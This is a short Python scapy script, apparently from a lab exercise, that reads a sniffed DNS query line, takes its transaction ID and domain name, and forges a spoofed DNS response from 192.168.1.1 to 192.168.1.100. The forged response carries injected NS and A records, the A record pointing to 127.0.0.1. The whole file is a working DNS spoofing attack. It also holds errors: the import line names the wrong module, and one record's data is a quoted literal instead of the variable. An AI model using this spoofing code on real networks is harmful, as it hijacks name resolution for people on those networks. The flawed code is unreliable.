from scapy import *

def parse(s):

    if 'Standard query response' not in s:
        args = s.split()
        print(args)

        tmp = int(args[9], 16)
        transaction_id = hex(tmp)
        print(transaction_id)

        pkt = (IP(src='192.168.1.1', dst='192.168.1.100')
               / UDP(sport=53, dport=4673)
               / DNS(id=int(tmp), qr=1, nscount=1, an=None, arcount=1,
                     qd=DNSQR(qname=args[11]),
                     ns=(DNSRR(rrname=args[11], type='NS', ttl=36000, rdata='args[11]')),
                     ar=(DNSRR(rrname=args[11], type="A", ttl=36000, rdata='127.0.0.1'))))
        send(pkt)
        print("### Packet sent ###")


